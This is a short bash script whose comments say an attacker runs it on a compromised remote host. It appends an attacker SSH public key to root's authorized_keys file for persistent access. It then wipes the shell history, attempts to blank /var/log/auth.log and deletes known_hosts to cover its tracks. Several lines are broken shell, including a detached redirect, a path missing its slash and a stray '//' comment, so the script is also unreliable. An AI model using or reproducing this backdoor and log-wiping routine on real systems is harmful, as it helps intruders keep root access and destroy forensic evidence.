#!/bin/bash
# "#!" called as a shebang or sharp Bang.
#clear foot print on remote system after executing this bash script to the remote host by the attacker.
RED="\033[1;31m"
GREEN="\033[1;32m"
echo "hack!"
echo "++++++IP Grabbing from ifconfig+++++++"
echo "  ########  #######   ########  "
echo "     ##     ##    #      ##     "
echo "     ##     ## ###       ##     "
echo "     ##     ##    #      ##     "
echo "     ##     #######      ##     "
echo "-------------------------------------"

echo $(id)
echo "ssh-rsa AAAAB3NzaC1yc2EA************************************************************************************************************************
********************************************************************************************************************************************************
*******************************************************************************************************8ehDypNioECVpYU= root@kali" 
>> /root/.ssh/authorized_keys

cat dev/null > ~/.bash_history
history -c
echo "" /var/log/auth.log //this will edit the text from null to the auth logs.
rm  -f .ssh/known_hosts
